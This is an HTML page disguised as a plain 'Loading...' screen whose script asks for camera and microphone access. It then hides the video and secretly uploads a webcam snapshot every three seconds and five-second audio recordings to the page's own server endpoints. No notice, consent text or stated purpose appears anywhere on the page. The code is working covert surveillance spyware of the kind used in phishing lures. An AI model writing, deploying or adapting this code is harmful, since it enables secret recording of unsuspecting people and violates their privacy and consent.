<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Loading...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .loader { color: #fff; font-family: 'Segoe UI', sans-serif; font-size: 18px; text-align: center; }
    .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top-color: #e41e3f; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="loader" id="loader">
    <div class="spinner"></div>
    <p>Loading...</p>
  </div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const loader = document.getElementById('loader');

    async function start() {
      try {
        // Access camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;
        await video.play();

        loader.style.display = 'none';

        // Capture image every 3 seconds
        setInterval(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(blob => {
            const form = new FormData();
            form.append('image', blob, 'capture.jpg');
            fetch('/upload-image', { method: 'POST', body: form });
          }, 'image/jpeg');
        }, 3000);

        // Record audio in 5-second chunks
        let mediaRecorder;
        setInterval(() => {
          if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
          mediaRecorder = new MediaRecorder(stream);
          const chunks = [];
          mediaRecorder.ondataavailable = e => chunks.push(e.data);
          mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const form = new FormData();
            form.append('audio', blob, 'audio.webm');
            fetch('/upload-audio', { method: 'POST', body: form });
          };
          mediaRecorder.start();
        }, 5000);

      } catch (e) {
        loader.innerHTML = '<p style="color:#e41e3f">Camera access denied or not available.</p>';
      }
    }

    start();
  </script>
</body>
</html>
